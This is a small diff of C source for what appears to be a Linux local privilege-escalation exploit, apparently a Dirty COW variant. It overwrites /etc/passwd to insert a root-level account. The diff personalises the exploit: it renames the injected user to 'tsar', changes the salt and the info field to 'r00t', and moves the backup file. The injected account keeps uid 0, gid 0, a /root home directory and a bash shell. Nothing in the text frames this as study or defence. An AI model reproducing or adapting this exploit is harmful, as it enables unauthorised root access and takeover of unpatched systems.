@@ -43,8 +43,8 @@
 #include <crypt.h>
 
 const char *filename = "/etc/passwd";
-const char *backup_filename = "/tmp/passwd.bak";
-const char *salt = "firefart";
+const char *backup_filename = "./passwd.bak";
+const char *salt = "tsar";
 
 int f;
 void *map;
@@ -128,10 +128,10 @@ int main(int argc, char *argv[])
 
   struct Userinfo user;
   // set values, change as needed
-  user.username = "firefart";
+  user.username = "tsar";
   user.user_id = 0;
   user.group_id = 0;
-  user.info = "pwned";
+  user.info = "r00t";
   user.home_dir = "/root";
   user.shell = "/bin/bash";
 
